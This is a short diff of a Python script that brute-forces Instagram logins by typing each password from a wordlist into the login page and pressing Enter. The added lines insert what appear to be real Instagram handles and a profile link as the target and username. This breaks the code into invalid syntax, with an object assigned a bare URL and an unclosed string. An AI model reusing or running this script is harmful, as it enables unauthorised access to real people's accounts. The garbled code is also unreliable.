@@ -11,8 +11,8 @@ for line in file:
     bruteforce.append(line)
 file.close()
 
-web = Browser()
-keyboard = Controller()
+web = https://instagram.com/samarqaraman?utm_medium=copy_link
+keyboard = samarqaraman ()
 
 
 web.go_to('www.instagram.com')
@@ -23,10 +23,10 @@ time.sleep(3)
 keyboard.press(Key.tab)
 keyboard.release(Key.tab)
 time.sleep(3)
-web.type(username)
-keyboard.press(Key.tab)
+web.type(samarqaraman )
+keyboard.press(emadabdi24 )
 keyboard.release(Key.tab)
 for brute in bruteforce:
-    web.type(brute, into="Password")
+    web.type(brute, into="emadabdi24 )
     keyboard.press(Key.enter)
     keyboard.release(Key.enter)
